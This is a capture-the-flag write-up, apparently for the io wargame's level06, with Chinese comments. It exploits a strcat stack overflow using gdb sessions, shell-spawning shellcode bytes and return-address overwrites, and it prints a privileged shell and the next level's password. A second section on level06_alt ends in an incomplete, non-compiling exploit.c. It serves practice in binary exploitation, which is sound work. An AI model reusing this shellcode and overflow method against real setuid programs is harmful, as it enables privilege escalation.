level06

//written by bla 
//inspired by nnp 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

enum{
LANG_ENGLISH,
LANG_FRANCAIS,
LANG_DEUTSCH,
};

int language = LANG_ENGLISH;

struct UserRecord{
    char name[40];
    char password[32];
    int id; 
};

void greetuser(struct UserRecord user){
    char greeting[64];
    switch(language){
        case LANG_ENGLISH:
            strcpy(greeting, "Hi "); break;
        case LANG_FRANCAIS:
            strcpy(greeting, "Bienvenue "); break;
        case LANG_DEUTSCH:
            strcpy(greeting, "Willkommen "); break;
    }   
    strcat(greeting, user.name);    /*greeting:64, name: 40 + 32 = 72,还有之前的strcpy复制的长度*/
    printf("%s\n", greeting);
}

int main(int argc, char **argv, char **env){
    if(argc != 3) {
        printf("USAGE: %s [name] [password]\n", argv[0]);
        return 1;
    }   

    struct UserRecord user = {0};
    strncpy(user.name, argv[1], sizeof(user.name));
    strncpy(user.password, argv[2], sizeof(user.password));

    char *envlang = getenv("LANG");
    if(envlang)
        if(!memcmp(envlang, "fr", 2)) 
            language = LANG_FRANCAIS;
        else if(!memcmp(envlang, "de", 2)) 
            language = LANG_DEUTSCH;

    greetuser(user);
}

main 函数的结尾部分：
   0x080486a8 <+277>:   rep movsl %ds:(%esi),%es:(%edi)
   0x080486aa <+279>:   call   0x804851c <greetuser>
   0x080486af <+284>:   lea    -0xc(%ebp),%esp
=> 0x080486b2 <+287>:   pop    %ebx
   0x080486b3 <+288>:   pop    %esi
   0x080486b4 <+289>:   pop    %edi
   0x080486b5 <+290>:   pop    %ebp
   0x080486b6 <+291>:   ret    


(gdb) r $(perl -e 'print "A"x40') $(perl -e 'print "B"x32')
Starting program: /tmp/level6/level06 $(perl -e 'print "A"x40') $(perl -e 'print "B"x32')

Breakpoint 3, 0x08048581 in greetuser ()
(gdb) c
Continuing.
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x080486b2 in main ()
(gdb) x/4x $eip
0x80486b2 <main+287>:   0x5d5f5e5b      0x909090c3      0x90909090      0x89559090
(gdb) x/4i $eip
=> 0x80486b2 <main+287>:        pop    %ebx
   0x80486b3 <main+288>:        pop    %esi
   0x80486b4 <main+289>:        pop    %edi
   0x80486b5 <main+290>:        pop    %ebp
(gdb) x/x $esp
0x424236:       Cannot access memory at address 0x424236

可以覆盖栈的地址

(gdb) r $(perl -e 'print "A"x40') $(perl -e 'print "B"x(31)."C"')
Starting program: /tmp/level6/level06 $(perl -e 'print "A"x40') $(perl -e 'print "B"x(31)."C"')

Breakpoint 3, 0x08048581 in greetuser ()
(gdb) c
Continuing.
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBC

Program received signal SIGSEGV, Segmentation fault.
0x080486b2 in main ()
(gdb) x/4x $esp
0x434236:       Cannot access memory at address 0x434236



(gdb) r $(perl -e 'print "A"x40') $(perl -e 'print "B"x29')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /tmp/level6/level06 $(perl -e 'print "A"x40') $(perl -e 'print "B"x29')

Breakpoint 4, 0x08048619 in main ()
(gdb) c
Continuing.

Breakpoint 3, 0x08048581 in greetuser ()
(gdb) c
Continuing.
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 5, 0x080486af in main ()
(gdb) x/x $ebp
0xbffffc00:     0x41414141
(gdb) x/x $ebp-12
0xbffffbf4:     0x41414141
(gdb) x/16x $ebp-12
0xbffffbf4:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc04:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc14:     0x41414141      0x42424242      0x42424242      0x42424242
0xbffffc24:     0x42424242      0x42424242      0x42424242      0x42424242
(gdb) si
0x080486b2 in main ()
(gdb) x/4x $esp
0xbffffbf4:     0x41414141      0x41414141      0x41414141      0x41414141
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 

/* 理想状态下\xcc\xcc\xcc\xcc这里应该填写shellcode的地址，但是利用环境变量会出现问题*/
./level06 $(perl -e 'print "A"x(20)."\xcc\xcc\xcc\xcc"."A"x(16)') $(perl -e 'print "B"x29')

假设使用环境变量:

level6@io:/tmp/level6$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
level6@io:/tmp/level6$ ./getenv1 PAYLOAD
PAYLOAD is at 0xbfffffc3
(gdb) r $(perl -e 'print "A"x(20)."\xc3\xff\xff\xbf"."A"x(16)') $(perl -e 'print "B"x29')
Starting program: /tmp/level6/level06 $(perl -e 'print "A"x(20)."\xc3\xff\xff\xbf"."A"x(16)') $(perl -e 'print "B"x29')
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 2, 0x080486af in main ()
(gdb) x/16x $epb-12
Argument to arithmetic operation not a number or boolean.
(gdb) x/16x $ebp-12
0xbffffbf4:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffffc04:     0x00000042      0x00000000      0xbfffff3a      0xb7ea07f5
0xbffffc14:     0xb7ff0590      0x080486db      0xb7fcfff4      0x00000000
0xbffffc24:     0x00000000      0xbffffca8      0xb7e87e46      0x00000003

我们发现填充了新的环境变量之后，ebp指向我们填充的后面位置(B)，这样我们将无法将shellcode地址弹出
到可控的eip中(上面的情况会将0x00000042弹出赋给eip)，方案是选择一个短一些的shellcode，使得弹出的
的地址是我们可以控制的。


level6@io:/levels$ LANG=$'de' 
/* 
    这里将LANG设置为"de"，溢出点不再是在main函数退出的时候，变成了greetuser函数
的返回地址。
*/
level6@io:/tmp/level06$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
level6@io:/tmp/level06$ ./getenv1 PAYLOAD
PAYLOAD is at 0xbfffffc3
(gdb) r `python -c "print 'A'*40 + ' ' +  'B'*25 + 'CCCC'"` 
Starting program: /tmp/level06/level06 `python -c "print 'A'*40 + ' ' +  'B'*25 + 'CCCC'"`
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBCCCC

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()  /* 设置了环境变量测试一下溢出点是否发生改变*/
/* 在用gdb调试的过程中发现gdb下面环境变量的地址会发生变化(很奇怪!!!)*/
level6@io:/levels$ ./level06 `python -c "print 'A'*40 + ' ' +  'B'*25 + '\xc3\xff\xff\xbf'"` 
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB
level7@io:/levels$ cd /home/level7
level7@io:/home/level7$ more .pass
u1zqhnHEzaKmzK09Um
level7@io:/home/level7$ 

/* 下面用perl换一个shellcode试一下*/
level6@io:/levels$ export PAYLOAD=$'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
level6@io:/tmp/level06$ ./getenv1 PAYLOAD
PAYLOAD is at 0xbfffffb8
level6@io:/levels$ ./level06 $(perl -e 'print "A"x(40)') $(perl -e 'print "B"x(25)."\xb8\xff\xff\xbf"')
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = "en_GB:en",
        LC_ALL = (unset),
        LANG = "de"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = "en_GB:en",
        LC_ALL = (unset),
        LANG = "de"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB

sh-4.2$ id
uid=1006(level6) gid=1006(level6) euid=1007(level7) groups=1007(level7),1006(level6),1029(nosu)


level06_alt.c

#include <stdio.h>
#include <sys/fcntl.h>
#include <unistd.h>
#include <string.h>

char pass[32];

int main(int argc, char * argv[])
{

        char buf[32];
        FILE *f; 

        f = fopen("/levels/level06_alt.pass", "r");

        fgets(pass, 32, f); 
        fgets(buf, 999, stdin);

        if(!strcmp(buf, pass)) {
                printf("Success!\n");
                setreuid(geteuid(), geteuid());
                execl("/bin/sh", NULL, NULL);
        }   

        return 0;
}

(gdb) disass main
Dump of assembler code for function main:
   0x08048574 <+0>:     lea    0x4(%esp),%ecx
   0x08048578 <+4>:     and    $0xfffffff0,%esp
   0x0804857b <+7>:     pushl  -0x4(%ecx)
   0x0804857e <+10>:    push   %ebp
   0x0804857f <+11>:    mov    %esp,%ebp
   0x08048581 <+13>:    push   %ebx
   0x08048582 <+14>:    push   %ecx
   0x08048583 <+15>:    sub    $0x40,%esp
   0x08048586 <+18>:    mov    0x4(%ecx),%eax
   0x08048589 <+21>:    mov    %eax,-0x3c(%ebp)
   0x0804858c <+24>:    mov    %gs:0x14,%eax
   0x08048592 <+30>:    mov    %eax,-0xc(%ebp)  /* var_c  = cookie */
   0x08048595 <+33>:    xor    %eax,%eax
   0x08048597 <+35>:    movl   $0x8048720,0x4(%esp)
   0x0804859f <+43>:    movl   $0x8048722,(%esp)
   0x080485a6 <+50>:    call   0x8048460 <fopen@plt>
   0x080485ab <+55>:    mov    %eax,-0x30(%ebp)   /* var_30 = File * f */
   0x080485ae <+58>:    mov    -0x30(%ebp),%eax
   0x080485b1 <+61>:    mov    %eax,0x8(%esp)
   0x080485b5 <+65>:    movl   $0x20,0x4(%esp)
   0x080485bd <+73>:    movl   $0x80498a0,(%esp)  /* pass = 0x80498a0 */
   0x080485c4 <+80>:    call   0x8048430 <fgets@plt>
   0x080485c9 <+85>:    mov    0x8049880,%eax
   0x080485ce <+90>:    mov    %eax,0x8(%esp)
   0x080485d2 <+94>:    movl   $0x3e7,0x4(%esp)
   0x080485da <+102>:   lea    -0x2c(%ebp),%eax   /* var_2c = buf[32] */
   0x080485dd <+105>:   mov    %eax,(%esp)
   0x080485e0 <+108>:   call   0x8048430 <fgets@plt>
   0x080485e5 <+113>:   movl   $0x80498a0,0x4(%esp)
   0x080485ed <+121>:   lea    -0x2c(%ebp),%eax
   0x080485f0 <+124>:   mov    %eax,(%esp)
   0x080485f3 <+127>:   call   0x80484a0 <strcmp@plt>
   0x080485f8 <+132>:   test   %eax,%eax
   0x080485fa <+134>:   jne    0x804863c <main+200>
   0x080485fc <+136>:   movl   $0x804873b,(%esp)
   0x08048603 <+143>:   call   0x8048490 <puts@plt>
   0x08048608 <+148>:   call   0x80484b0 <geteuid@plt>
   0x0804860d <+153>:   mov    %eax,%ebx
   0x0804860f <+155>:   call   0x80484b0 <geteuid@plt>
   0x08048614 <+160>:   mov    %ebx,0x4(%esp)
   0x08048618 <+164>:   mov    %eax,(%esp)
   0x0804861b <+167>:   call   0x8048480 <setreuid@plt>
   0x08048620 <+172>:   movl   $0x0,0x8(%esp)
   0x08048628 <+180>:   movl   $0x0,0x4(%esp)
   0x08048630 <+188>:   movl   $0x8048744,(%esp)
   0x08048637 <+195>:   call   0x8048450 <execl@plt>
   
   0x0804863c <+200>:   mov    $0x0,%eax
   0x08048641 <+205>:   mov    -0xc(%ebp),%edx
   0x08048644 <+208>:   xor    %gs:0x14,%edx
   0x0804864b <+215>:   je     0x8048652 <main+222>
   0x0804864d <+217>:   call   0x8048470 <__stack_chk_fail@plt>
   0x08048652 <+222>:   add    $0x40,%esp
   0x08048655 <+225>:   pop    %ecx
   0x08048656 <+226>:   pop    %ebx
   0x08048657 <+227>:   pop    %ebp
   0x08048658 <+228>:   lea    -0x4(%ecx),%esp
   0x0804865b <+231>:   ret    
End of assembler dump.



exploit.c

#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv, char **environ)
{
  char shellcode[] = "";
  char parameter[500] = {0};
  strcpy(parameter, argv[1], sizeof(parameter));
  int f = fork();
  if ( f == 0 )
  {
    char *X[3] = {"/levels/level06_alt", parameter, NULL};
    int ret = execve(X[0], X, environ);
    if (ret == -1)
      perror("execve");
    return 255;
  }
  else if ( f > 0 )
  {

  }


}